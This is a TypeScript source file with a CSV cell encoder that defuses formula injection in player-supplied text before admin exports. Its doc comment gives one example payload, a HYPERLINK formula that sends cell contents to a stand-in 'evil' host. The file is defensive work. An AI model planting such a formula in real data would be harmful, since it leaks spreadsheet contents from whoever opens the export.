/**
 * CSV cell encoding shared by every CSV export route.
 *
 * Exports carry player-controlled text (Steam nicknames, clan tags, note
 * bodies, reasons). A cell whose text starts with `=`, `+`, `-`, `@`, a tab or
 * a carriage return is evaluated as a formula by Excel and LibreOffice, so a
 * nickname like `=HYPERLINK("http://evil/?"&A1)` would run on the admin's
 * machine when the export is opened. Such text is prefixed with an apostrophe,
 * which spreadsheets treat as "literal text" and hide
 * (https://owasp.org/www-community/attacks/CSV_Injection).
 */

const FORMULA_PREFIX = /^[=+\-@\t\r]/;
const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;
const NEEDS_QUOTING = /[",;\r\n]/;

/**
 * Encodes one value as an RFC 4180 CSV field with formula neutralisation.
 *
 * Numbers, bigints and booleans are written as-is. Strings that would start a
 * formula get a leading `'` unless they are a plain decimal number (so `-3`
 * stays a number), then are quoted when they contain a quote, comma,
 * semicolon or line break.
 *
 * @param value - The cell value; `null`/`undefined` become an empty field.
 * @returns The encoded field, without the separating comma.
 */
export function csvCell(value: string | number | bigint | boolean | null | undefined): string {
  if (value === null || value === undefined) return '';
  if (typeof value !== 'string') return String(value);
  const text = FORMULA_PREFIX.test(value) && !PLAIN_NUMBER.test(value) ? `'${value}` : value;
  if (NEEDS_QUOTING.test(text)) return `"${text.replace(/"/g, '""')}"`;
  return text;
}
